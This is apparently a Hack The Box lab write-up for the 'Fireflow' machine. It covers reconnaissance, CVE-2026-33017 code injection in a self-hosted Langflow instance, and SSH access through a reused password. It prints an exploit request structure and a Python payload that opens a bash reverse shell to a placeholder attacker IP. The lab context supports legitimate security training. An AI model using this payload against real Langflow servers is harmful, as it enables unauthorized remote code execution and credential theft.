# Fireflow — HTB Machine

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Type](https://img.shields.io/badge/Type-Linux-blue)
![Status](https://img.shields.io/badge/Status-User%20Flag%20Obtained%20%7C%20Root%20Pending-yellow)

An unauthenticated code-injection vulnerability in a self-hosted Langflow AI-agent instance leads to remote code execution, and reused superuser credentials pivot straight into a Linux user account over SSH.

## Techniques Used

- Nmap SYN/version scanning
- Virtual host / subdomain discovery via `/etc/hosts`
- Application fingerprinting via unauthenticated API endpoint
- CVE research and public PoC adaptation
- Remote code execution (CVE-2026-33017)
- Linux enumeration with linpeas
- Credential reuse for lateral movement

## Attack Summary

```text
Nmap --> 22 (ssh), 443 (https), 9100 filtered
443 redirects to fireflow.htb --> hosts file entry
AI Agent link --> flow.fireflow.htb --> hosts file entry
Langflow login page found --> /api/v1/version leaks 1.8.2
CVE-2026-33017 identified --> public flow-build RCE
Reverse shell as www-data
linpeas / .env leak Langflow superuser password
Password reused for Linux user "nightfall" --> SSH access --> user.txt
Root: not yet solved
```

## Key Vulnerability

**CVE-2026-33017** — Langflow's `/api/v1/build_public_tmp/{flow-id}/flow` endpoint accepts a flow definition containing a custom component. The `code` field of that component is executed server-side with **no sandboxing and no authentication required**, allowing arbitrary command execution.

```python
# Conceptual vulnerable pattern
exec(user_supplied_flow_code)   # no auth check, no sandbox
```

## Request Analysis

### Fingerprinting Request
```http
GET /api/v1/version HTTP/1.1
Host: flow.fireflow.htb
```
```json
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

### Exploit Request (structure)
```http
POST /api/v1/build_public_tmp/{flow-id}/flow HTTP/1.1
Host: flow.fireflow.htb
Content-Type: application/json

{"data":{"nodes":[{"data":{"node":{"template":{"code":{"value":"<malicious python>"}}}}}],"edges":[]}}
```

## Exploit Payload

Python embedded in the flow node's `code` field spawns a reverse shell:

```python
import os
_x = os.system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1'")

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class ExploitComp(Component):
    display_name = "X"
    outputs = [Output(display_name="O", name="o", method="r")]
    def r(self) -> Data:
        return Data(data={})
```

## Why It Works

| Factor | Explanation |
|---|---|
| No authentication required | The "public" flow-build endpoint is reachable without any login |
| No sandboxing | Submitted Python code runs directly on the host |
| Secrets in plaintext | Superuser credentials sit in the process environment and `.env` file |
| Credential reuse | Application password unlocks a real Linux user account |

## References

- [SonicWall — Langflow AI Code Injection to RCE](https://www.sonicwall.com/blog/langflow-ai-code-injection-to-rce-flaw)
- [NVD — CVE-2026-33017](https://nvd.nist.gov/vuln/detail/cve-2026-33017)
- [EQSTLab CVE-2026-33017 PoC](https://github.com/EQSTLab/CVE-2026-33017)
